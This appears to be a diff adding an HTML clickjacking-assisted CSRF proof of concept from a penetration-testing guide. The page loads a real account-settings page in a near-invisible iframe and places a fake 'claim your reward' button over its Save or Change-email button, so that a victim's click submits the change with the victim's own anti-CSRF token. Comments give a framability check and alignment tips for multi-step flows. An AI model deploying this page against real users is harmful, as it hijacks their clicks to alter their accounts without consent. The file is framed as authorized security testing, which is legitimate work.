@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<!--
+  clickjack_csrf.html — Clickjacking-assisted CSRF PoC (CSRF_TESTING_GUIDE.md §10.5).
+
+  Use when the state-changing request MUST carry a valid anti-CSRF token (so you can't forge it blindly), BUT:
+    (a) the target page is FRAMABLE — no X-Frame-Options and no Content-Security-Policy: frame-ancestors, AND
+    (b) the session cookie reaches the framed sub-resource — i.e. SameSite=None (or you are same-site).
+  The framed REAL page carries the VICTIM'S real token; you only steal the click (UI redress).
+
+  AUTHORIZED testing, OWN account only. First check framability:
+     curl -sI https://target.com/account/settings | grep -iE 'x-frame-options|content-security-policy'
+  Then align #bait over the real submit button (use opacity:0.5 while positioning, then drop to ~0).
+  Take the page down after; revert any change.
+-->
+<html><head><meta charset="utf-8"><title>cj-csrf poc</title></head>
+<body style="margin:0">
+<style>
+  /* the real page, made (near) invisible and placed on top */
+  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 1000px; height: 800px; z-index: 2; border: 0; }
+  /* the lure the victim actually thinks they are clicking */
+  #bait  { position: absolute; z-index: 1; top: 330px; left: 480px; padding: 14px 22px;
+           font: 16px/1 system-ui, sans-serif; background:#2d7; color:#04210f; border-radius:8px; cursor:pointer; }
+  body   { height: 100vh; }
+</style>
+
+<div id="bait">Click to claim your reward 🎁</div>
+
+<!-- the REAL target page; it submits with the victim's own valid token after the redress click -->
+<iframe src="https://target.com/account/settings"></iframe>
+
+<!--
+  Tuning notes:
+  - Set iframe opacity to 0.5 temporarily to align #bait exactly over the genuine "Save"/"Change email" button.
+  - For multi-step flows, reposition #bait over each successive button (or pre-fill the framed form's fields first).
+  - If the cookie is SameSite=Lax/Strict, the framed sub-resource will NOT receive it unless you are same-site —
+    then clickjacking-CSRF does not apply (note that honestly).
+-->
+</body></html>
